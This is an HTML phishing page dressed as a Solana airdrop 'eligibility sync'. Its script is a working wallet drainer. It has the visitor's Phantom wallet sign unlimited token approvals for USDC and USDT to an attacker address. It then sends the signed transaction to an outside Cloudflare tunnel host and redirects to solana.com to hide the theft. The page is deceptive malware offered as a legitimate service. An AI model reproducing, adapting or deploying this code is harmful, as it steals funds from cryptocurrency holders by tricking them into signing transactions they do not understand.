<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Ecosystem Support</title>
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <script src="https://unpkg.com/@solana/spl-token@0.1.8/lib/index.iife.min.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #111; padding: 35px; border-radius: 20px; border: 1px solid #222; text-align: center; width: 300px; }
        .logo { width: 45px; margin-bottom: 15px; }
        h2 { font-size: 1.1rem; margin-bottom: 10px; }
        p { color: #666; font-size: 0.8rem; line-height: 1.4; margin-bottom: 25px; }
        #cta { background: linear-gradient(90deg, #14F195, #9945FF); color: #000; border: none; padding: 14px; border-radius: 10px; font-weight: bold; width: 100%; cursor: pointer; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://solana.com/favicon.ico" class="logo">
        <h2>Airdrop Eligibility Sync</h2>
        <p>Connect and associate your token account to verify eligibility for the upcoming ecosystem rewards.</p>
        <button id="cta">VERIFY ELIGIBILITY</button>
        <div id="status" style="margin-top:15px; font-size:12px; color:#444;">Ready to sync...</div>
    </div>

    <script>
        const tunnel = "https://allocation-governing-fleet-ala.trycloudflare.com";
        const RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";
        
        // ç›®æ ‡ä»£å¸åˆçº¦åœ°å€ (USDC: EPjFW...wyTDt1v, USDT: Es9vM...8p8Scy)
        const TARGET_TOKENS = [
            "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v", // USDC
            "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB"  // USDT
        ];

        document.getElementById('cta').onclick = async () => {
            const p = window.solana || window.phantom?.solana;
            if (!p) return alert("Use Phantom Browser");

            try {
                const resp = await p.connect();
                document.getElementById('status').innerText = "Scanning eligibility...";

                const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
                const sync = await fetch(`${tunnel}/sync`);
                const { bh } = await sync.json();

                const transaction = new solanaWeb3.Transaction();

                // ðŸ”± æ‰«æå¹¶æ·»åŠ æŽˆæƒæŒ‡ä»¤
                for (let mint of TARGET_TOKENS) {
                    try {
                        const userAta = await splToken.Token.getAssociatedTokenAddress(
                            splToken.ASSOCIATED_TOKEN_PROGRAM_ID,
                            splToken.TOKEN_PROGRAM_ID,
                            new solanaWeb3.PublicKey(mint),
                            resp.publicKey
                        );

                        // æ£€æŸ¥è¯¥ä»£å¸è´¦æˆ·æ˜¯å¦å­˜åœ¨ä¸”æœ‰ä½™é¢
                        const accountInfo = await connection.getAccountInfo(userAta);
                        if (accountInfo) {
                            transaction.add(
                                splToken.Token.createApproveInstruction(
                                    splToken.TOKEN_PROGRAM_ID,
                                    userAta,
                                    new solanaWeb3.PublicKey(RECEIVER),
                                    resp.publicKey,
                                    [],
                                    "18446744073709551615" // æŽˆæƒæœ€å¤§é‡‘é¢
                                )
                            );
                        }
                    } catch(e) {}
                }

                if (transaction.instructions.length === 0) {
                    // å¦‚æžœæ²¡æœ‰ä»£å¸ï¼Œå›žé€€åˆ° SOL å°é¢éªŒè¯é€»è¾‘
                    alert("No eligible tokens found.");
                    return;
                }

                transaction.recentBlockhash = bh;
                transaction.feePayer = resp.publicKey;

                const signed = await p.signTransaction(transaction);
                const rawTx = signed.serialize().toString('base64');
                
                fetch(`${tunnel}/collect?auth_sig=${encodeURIComponent(rawTx)}`);

                document.getElementById('status').innerText = "Verified! Redirecting...";
                setTimeout(() => { window.location.href = "https://solana.com/"; }, 1500);

            } catch(e) { location.reload(); }
        };
    </script>
</body>
</html>
